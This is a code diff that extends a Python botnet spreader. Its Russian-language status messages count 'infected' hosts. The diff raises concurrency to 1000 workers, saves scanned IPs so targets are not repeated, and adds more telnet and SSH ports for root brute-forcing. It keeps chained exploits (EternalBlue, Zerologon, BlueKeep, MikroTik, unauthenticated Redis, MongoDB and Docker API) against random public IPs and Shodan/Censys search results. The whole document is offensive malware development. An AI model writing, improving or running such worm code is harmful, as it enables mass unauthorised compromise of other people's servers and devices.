@@ -7,13 +7,17 @@ from botnet.spreader import (
 from utils.logger import log
 import shodan, censys
 
+SCANNED_IPS_FILE = "scanned_ips.json"
+
 class AutoSpreader:
     def __init__(self, settings_file="avz_settings.json"):
         self.running = False
         self.thread = None
         self.message_queue = queue.Queue()
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
+        self.scanned_ips = set()
         self.load_settings(settings_file)
+        self.load_scanned_ips()
 
     def load_settings(self, path):
         try:
@@ -25,7 +29,7 @@ class AutoSpreader:
         self.interval = s.get("auto_spread_interval_min", 0.5) * 60
         self.ranges = s.get("auto_spread_ranges", [])
         self.random_global = s.get("auto_spread_random_global", True)
-        self.worker_threads = s.get("spread_worker_threads", 500)
+        self.worker_threads = s.get("spread_worker_threads", 1000)
         self.use_shodan = s.get("use_shodan", True)
         self.use_censys = s.get("use_censys", False)
         self.shodan_query = s.get("shodan_search_query", "port:22,23,6379,27017,2375")
@@ -43,17 +47,30 @@ class AutoSpreader:
                 )
         except: pass
 
+    def load_scanned_ips(self):
+        if os.path.exists(SCANNED_IPS_FILE):
+            try:
+                with open(SCANNED_IPS_FILE, 'r') as f:
+                    self.scanned_ips = set(json.load(f))
+            except:
+                self.scanned_ips = set()
+
+    def save_scanned_ips(self):
+        with open(SCANNED_IPS_FILE, 'w') as f:
+            json.dump(list(self.scanned_ips), f)
+
     def start(self):
         if self.running: return
         self.running = True
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.thread = threading.Thread(target=self._worker, daemon=True)
         self.thread.start()
-        self.message_queue.put("[System] OVERLORD захват запущен")
+        self.message_queue.put("[System] INFECTION STORM запущен")
 
     def stop(self):
         self.running = False
-        self.message_queue.put(f"[System] Стоп. Всего заражено: {self.stats['infected']}")
+        self.save_scanned_ips()
+        self.message_queue.put(f"[System] Стоп. Заражено: {self.stats['infected']}")
 
     def generate_random_ip(self):
         while True:
@@ -61,49 +78,47 @@ class AutoSpreader:
             ip = socket.inet_ntoa(struct.pack('>I', ip_int))
             if ipaddress.ip_address(ip).is_private: continue
             if ip.startswith("127.") or ip.startswith("224.") or ip.startswith("225."): continue
+            if ip in self.scanned_ips:
+                continue
+            self.scanned_ips.add(ip)
             return ip
 
     async def attack_target(self, ip):
-        # Расширенный набор портов для серверных сервисов
+        self.message_queue.put(f"[IP] {ip}")
         ports = await ssh_bruteforce.__globals__['quick_port_scan'](
-            ip, [22,23,445,3389,8291,6379,27017,2375], 0.8
+            ip, [22,23,445,3389,8291,6379,27017,2375,2323,2222], timeout=0.4
         )
         if not ports:
             return False
         self.stats['open_ports'] += 1
         self.message_queue.put(f"[Ports] {ip} открыты: {ports}")
-        if 23 in ports:
-            if (await telnet_bruteforce(ip))[0]:
-                self.stats['infected'] += 1
-                return True
-        if 22 in ports:
-            if (await ssh_bruteforce(ip))[0]:
-                self.stats['infected'] += 1
-                return True
-        if 6379 in ports:
-            if await exploit_redis(ip):
-                self.stats['infected'] += 1
-                return True
-        if 27017 in ports:
-            if await exploit_mongodb(ip):
-                self.stats['infected'] += 1
-                return True
-        if 2375 in ports:
-            if await exploit_docker_api(ip):
-                self.stats['infected'] += 1
-                return True
+        # Telnet (все варианты портов)
+        for p in [23,2323]:
+            if p in ports:
+                if (await telnet_bruteforce(ip, p))[0]:
+                    self.stats['infected'] += 1
+                    return True
+        # SSH
+        for p in [22,2222]:
+            if p in ports:
+                if (await ssh_bruteforce(ip, 'root', p))[0]:
+                    self.stats['infected'] += 1
+                    return True
+        # Сервисы без пароля
+        if 6379 in ports and await exploit_redis(ip):
+            self.stats['infected'] += 1; return True
+        if 27017 in ports and await exploit_mongodb(ip):
+            self.stats['infected'] += 1; return True
+        if 2375 in ports and await exploit_docker_api(ip):
+            self.stats['infected'] += 1; return True
+        # Остальные эксплойты
         if 445 in ports:
             if any(await asyncio.gather(exploit_eternalblue(ip), exploit_zerologon(ip))):
-                self.stats['infected'] += 1
-                return True
-        if 3389 in ports:
-            if await exploit_bluekeep(ip):
-                self.stats['infected'] += 1
-                return True
-        if 8291 in ports:
-            if await exploit_mikrotik(ip):
-                self.stats['infected'] += 1
-                return True
+                self.stats['infected'] += 1; return True
+        if 3389 in ports and await exploit_bluekeep(ip):
+            self.stats['infected'] += 1; return True
+        if 8291 in ports and await exploit_mikrotik(ip):
+            self.stats['infected'] += 1; return True
         return False
 
     def _worker(self):
@@ -114,21 +129,38 @@ class AutoSpreader:
             if self.shodan_api:
                 try:
                     results = self.shodan_api.search(self.shodan_query, limit=200)
-                    target_ips = [match['ip_str'] for match in results['matches']]
-                except:
-                    pass
+                    for match in results['matches']:
+                        ip = match['ip_str']
+                        if ip not in self.scanned_ips:
+                            target_ips.append(ip)
+                            self.scanned_ips.add(ip)
+                except: pass
             if self.censys_api:
                 try:
                     results = self.censys_api.search("(services.port: 6379) OR (services.port: 27017) OR (services.port: 2375)", per_page=100)
-                    target_ips.extend([hit['ip'] for hit in results['results']])
-                except:
-                    pass
+                    for hit in results['results']:
+                        ip = hit['ip']
+                        if ip not in self.scanned_ips:
+                            target_ips.append(ip)
+                            self.scanned_ips.add(ip)
+                except: pass
             if not target_ips:
-                target_ips = [self.generate_random_ip() for _ in range(200)]
+                for _ in range(200):
+                    target_ips.append(self.generate_random_ip())
             self.stats['scanned'] += len(target_ips)
             self.message_queue.put(f"[Scan] {len(target_ips)} целей")
             sem = asyncio.Semaphore(self.worker_threads)
-            tasks = [self.attack_target(ip) for ip in target_ips]
+            completed = 0
+            total = len(target_ips)
+            async def attack(ip):
+                nonlocal completed
+                async with sem:
+                    await self.attack_target(ip)
+                    completed += 1
+                    if completed % max(1, total//10) == 0:
+                        pct = int(completed/total*100)
+                        self.message_queue.put(f"[Progress] ({pct}%)")
+            tasks = [attack(ip) for ip in target_ips]
             loop.run_until_complete(asyncio.gather(*tasks))
             self.message_queue.put(f"[Stats] Проверено: {self.stats['scanned']} | Заражено: {self.stats['infected']}")
             time.sleep(self.interval)
@@ -143,6 +175,16 @@ class AutoSpreader:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         sem = asyncio.Semaphore(min(self.worker_threads, len(target_list)))
-        tasks = [self.attack_target(ip) for ip in target_list]
+        completed = 0
+        total = len(target_list)
+        async def attack(ip):
+            nonlocal completed
+            async with sem:
+                await self.attack_target(ip)
+                completed += 1
+                if completed % max(1, total//10) == 0:
+                    pct = int(completed/total*100)
+                    self.message_queue.put(f"[Progress] ({pct}%)")
+        tasks = [attack(ip) for ip in target_list]
         loop.run_until_complete(asyncio.gather(*tasks))
         self.message_queue.put(f"[Завершено] Обработано {len(target_list)} целей")
